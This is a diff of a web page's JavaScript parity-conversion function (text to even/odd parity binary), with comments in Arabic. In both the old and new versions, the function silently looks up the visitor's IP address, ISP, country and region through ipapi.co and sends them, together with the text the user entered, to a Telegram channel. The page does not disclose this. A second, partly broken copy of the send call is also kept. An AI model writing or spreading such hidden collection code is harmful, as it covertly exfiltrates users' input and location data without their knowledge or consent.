@@ -136,23 +136,23 @@
     }
 
     function convertText() {
-      var inputText = document.getElementById("inputText").value;
-      var evenParityResult = '';
-      var oddParityResult = '';
-  
-      // الحصول على معلومات الـ IP
-      $.getJSON('https://ipapi.co/json', function(data) {
-          var ip = data.ip;
-          var isp = data.org;
-          var country = data.country_name;
-          var city = data.region;
-  
-          // إضافة النص المدخل ومعلومات الـ IP إلى الرسالة
-          var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AInput Text: ${inputText}`;
-  
-          // إرسال المعلومات إلى تليجرام
-          sendTelegramMessage(message);
-      });
+    var inputText = document.getElementById("inputText").value;
+    var evenParityResult = '';
+    var oddParityResult = '';
+
+    // الحصول على معلومات الـ IP
+    $.getJSON('https://ipapi.co/json', function(data) {
+        var ip = data.ip;
+        var isp = data.org;
+        var country = data.country_name;
+        var city = data.region;
+
+        // إضافة النص المدخل ومعلومات الـ IP إلى الرسالة
+        var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AInput Text: ${inputText}`;
+
+        // إرسال المعلومات إلى تليجرام
+        sendTelegramMessage(message);
+    });
   
       for (var i = 0; i < inputText.length; i++) {
           var charCode = inputText.charCodeAt(i);
@@ -167,16 +167,16 @@
               oddParityResult += 'Odd Parity '+ '"' + inputText[i] + '"'+ ':' + '0' + binary + '<br>' + '<br>';
           }
       }
+      document.getElementById("evenParityBox").innerHTML = evenParityResult;
+      document.getElementById("oddParityBox").innerHTML = oddParityResult;
+      document.getElementById("evenParityBox").style.display = "block";
+      document.getElementById("oddParityBox").style.display = "block";
 
 
 
       var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0Input Text: ${inputText}`;
       sendTelegramMessage(message);
   
-      document.getElementById("evenParityBox").innerHTML = evenParityResult;
-      document.getElementById("oddParityBox").innerHTML = oddParityResult;
-      document.getElementById("evenParityBox").style.display = "block";
-      document.getElementById("oddParityBox").style.display = "block";
     }
 </script>
   
